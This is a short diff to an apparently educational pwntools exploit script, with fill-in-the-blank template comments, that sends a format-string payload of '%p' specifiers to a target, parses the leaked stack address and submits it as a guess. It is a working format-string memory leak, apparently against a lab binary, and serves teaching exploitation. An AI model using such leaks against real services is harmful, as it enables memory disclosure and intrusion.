@@ -13,7 +13,7 @@ for _ in range(10):
     r.sendline(b"%p %p %p %p %p %p %p %p %p") # Add your format string code here!
     leak = r.recvline()
     # Add your code to receive leak val here , format: val = leak[idx_1:idx_2], please think about the idx
-    val = leak[-17:-1] # you need to fill in idx_1, and idx_2 by yourself
+    val = str(leak).replace("\\n'", "").split(" ")[-1] # gets last address
     val = str(int(val, 16)).encode()
     
     r.recvuntil(b"Guess?") #Think about what should be received?
